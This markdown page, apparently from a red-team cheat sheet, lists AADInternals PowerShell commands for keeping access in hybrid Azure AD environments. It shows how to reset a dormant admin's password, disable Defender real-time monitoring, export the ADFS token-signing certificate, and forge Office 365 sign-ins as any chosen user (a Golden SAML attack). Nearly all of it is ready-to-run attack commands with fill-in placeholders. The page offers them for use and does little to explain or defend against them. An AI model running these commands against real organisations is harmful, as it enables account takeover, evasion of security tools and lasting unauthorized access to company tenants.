---
title: Persistence
description: Recon
position: 5
---

# Persistence

## Reactivate a inactive Admin

There are times when a inactive admin is just there waiting to be activated

```powershell
# Get immutableid
Get-AADIntUser - UserPrincipalName {{ Email mail@mail.com }}| select ImmutableId

# Reset onpremadmin password
Set-AADIntUserPassword - SourceAnchor "{{ ImmutableId immutableid }}" -Password "{{ Password SuperSecretpass#12321 }}" –Verbose
```

## Extract ADFS token-signing certificate

Many organizations setup the ADFS role to be Domain Admin on the on premise domain controller. If this is the case we can get a domain admin powershell session using the known credentials.

To export the certificate we will need to copy AADInternals as well:

```powershell 
Copy-Item -ToSession {{ PSSession $pssession }} -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\adconnectadmin\Documents

Enter-PSSession {{ PSSession $pssession }}

Set-MpPreference - DisableRealtimeMonitoring $true
Expand-Archive C:\Users\adconnectadmin\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\adconnectadmin\Documents\AADInternals
Import-Module C:\Users\adconnectadmin\Documents\AADInternals\AADInternals.psd1
```

To export the signing certificate there is a easy to use cmdlet:

```powershell
# Export the token signing certificate
Export-AADIntADFSSigningCertificate
```

We also need the ImmutableID of the user, this can be obtained from any machine

```powershell
# Get ImmutableID of the user in a machine
Import-Module C:\AzAD\Tools\ADModule\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AzAD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1

[System.Convert]::ToBase64String((Get-ADUser -Identity {{ Username username }} -Server {{ IP ip }} -Credential $creds | select -ExpandProperty ObjectGUID).tobytearray())
```

Then we can use the token signing certificate for the user and machine that we want to compromise

```powershell
# Use token with the inmutableID
Open-AADIntOffice365Portal -ImmutableID {{ ImmutableID immutableid }}-Issuer {{ IssuerURI http://deffin.com/adfs/services/trust }} -PfxFileName {{ CertificatePath C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx }} -Verbose
```

It will generate a html that can be copied to our machine

```powershell
ls C:\Users\adfsadmin\AppData\Local\Temp\*.tmp.html

Copy-Item -FromSession $adfs -Path C:\Users\adfsadmin\AppData\Local\Temp\tmp9E0F.tmp.html -Destination C:\AzAD\Tools\
```

Opening such HTML in the machine provide access with the configured user for the configured tenant